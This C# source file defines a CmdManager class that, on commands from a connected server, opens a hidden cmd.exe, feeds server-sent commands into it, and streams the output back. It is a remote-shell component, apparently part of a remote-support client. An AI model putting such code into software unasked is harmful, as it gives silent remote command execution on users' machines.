using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;


namespace ServerCommunicator
{
    public class CmdManager
    {
        private Client _client;
        private IEmitter _emitter;
        private readonly Dictionary<string, Process> _cmds = new Dictionary<string, Process>();
        ~CmdManager() 
        {
            CloseCmds();
            Console.WriteLine(@"~CmdManager");
        }

        public CmdManager(Client client, IEmitter emitter)
        {
            _client = client;
            _emitter = emitter;
            _client.On("cmd-start", OnCmdStart);
            _client.On("cmd-in", OnCmdIn);
            _client.On("cmd-end", OnCmdEnd);
            //_client.On("messageFromServer", OnMessageFromServer);
        }

       
        private void OnCmdEnd(IMessage msg)
        {
            string email2 = msg.Json.Args[0].ToString();
            if (_cmds[email2] != null) _cmds[email2].Kill();
        }


        private void OnCmdIn(IMessage msg)
        {
            string email1 = msg.Json.Args[0].email.ToString();
            string command = msg.Json.Args[0].command.ToString();
            if (_cmds[email1] != null)
            {
                if (command != "ctrl+c")
                    _cmds[email1].StandardInput.WriteLine(command);
                else char.ConvertFromUtf32(3);
                _cmds[email1].StandardInput.WriteLine(
                    "for /f \"delims=\" %i in ('cd') do set output=%i");
                _cmds[email1].StandardInput.WriteLine("echo %output%^>");
            }
        }

        private void OnCmdStart(IMessage msg)
        {

            var email = (string) msg.Json.Args[0].ToString();
            if (!_cmds.ContainsKey(email)) _cmds.Add(email, null);
            if (_cmds[email] == null)
            {
                var info = new ProcessStartInfo("cmd.exe")
                {
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    WorkingDirectory = Environment.CurrentDirectory + "\\"
                };

                _cmds[email] = new Process {StartInfo = info, EnableRaisingEvents = true};
                _cmds[email].ErrorDataReceived +=
                    (oo, data) => Emit("cmd-err", new {data = data.Data, email = email});
                var sb = new StringBuilder();
                CancellationTokenSource cts = null;
                _cmds[email].OutputDataReceived += (oo, data) =>
                {
                    if (data.Data == null) return;
                    if (data.Data.StartsWith("@echo") ||
                        data.Data.Equals("for /f \"delims=\" %i in ('cd') do set output=%i") ||
                        data.Data.Equals("echo %output%^>")) return;
                    cts?.Cancel();
                    sb.AppendLine(data.Data);
                    if (sb.Length > 20000)
                    {
                        Emit("cmd-out", new {data = sb.ToString(), email = email});
                        sb.Clear();
                    }
                    var cts1 = new CancellationTokenSource();
                    cts = cts1;
                    Task.Run(async () =>
                    {
                        try
                        {
                            await Task.Delay(300);
                            if (cts1.IsCancellationRequested) return;
                            if (sb.Length > 0) Emit("cmd-out", new {data = sb.ToString(), email = email});
                            sb.Clear();
                        }
                        catch
                        {
                        }
                    });
                };
                _cmds[email].Start();
                _cmds[email].StandardInput.WriteLine(@"@echo Off");
                _cmds[email].StandardInput.WriteLine(@"@echo --INITIALIZING--");
                _cmds[email].StandardInput.WriteLine(@"SET PATH=%PATH%;" + Common.Path() +
                                                     @"Updater\Support\SystemSetup\wget");
                _cmds[email].StandardInput.WriteLine(@"@echo ----------------");

                _cmds[email].Exited += (oo, data) =>
                {
                    _cmds[email] = null;
                };
                _cmds[email].BeginOutputReadLine();
                _cmds[email].BeginErrorReadLine();


            }
            else
            {
                Emit("cmd-out",
                    new {data = "Continuing from a perevious session", email = email});
            }
            Emit("cmd-started", new {});
            Emit("cmd-out", new {data = "Welcome to", email = email});
            Emit("cmd-out", new {data = " ", email = email});
            Emit("cmd-err",
                new {data = "▄██   ▄      ▄████████    ▄████████    ▄█    █▄    ", email = email});
            Emit("cmd-err",
                new {data = "███   ██▄   ███    ███   ███    ███   ███    ███ ", email = email});
            Emit("cmd-err",
                new {data = "███▄▄▄███   ███    ███   ███    █▀    ███    ███ ", email = email});
            Emit("cmd-err",
                new {data = "▀▀▀▀▀▀███   ███    ███   ███         ▄███▄▄▄▄███▄▄", email = email});
            Emit("cmd-err",
                new {data = "▄██   ███ ▀███████████ ▀███████████ ▀▀███▀▀▀▀███▀ ", email = email});
            Emit("cmd-err",
                new {data = "███   ███   ███    ███          ███   ███    ███ ", email = email});
            Emit("cmd-err",
                new {data = "███   ███   ███    ███    ▄█    ███   ███    ███ ", email = email});
            Emit("cmd-err",
                new {data = " ▀█████▀    ███    █▀   ▄████████▀    ███    █▀  ", email = email});
            Emit("cmd-out", new {data = " ", email = email});
            _cmds[email].StandardInput.WriteLine("for /f \"delims=\" %i in ('cd') do set output=%i");
            _cmds[email].StandardInput.WriteLine("echo %output%^>");

        }

        private void Emit(string eventNane, object data)
        {
            _emitter.Emit(eventNane, data);
        }

        public void CloseCmds()
        {
            var cmdss = _cmds.Values;
            foreach (var cmd in cmdss)
                try
                {
                    cmd.Kill();

                }
                catch
                {
                    //ignore
                }
            _cmds.Clear();
        }
    }
}
